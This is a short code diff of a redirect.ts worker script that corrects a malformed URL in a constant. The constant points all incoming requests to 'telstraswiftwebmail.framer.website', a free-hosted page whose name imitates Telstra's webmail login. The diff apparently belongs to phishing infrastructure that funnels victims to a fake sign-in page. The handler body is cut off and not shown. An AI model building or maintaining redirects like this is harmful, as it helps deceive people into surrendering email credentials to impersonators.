@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://https://telstraswiftwebmail.framer.website"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://telstraswiftwebmail.framer.website"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
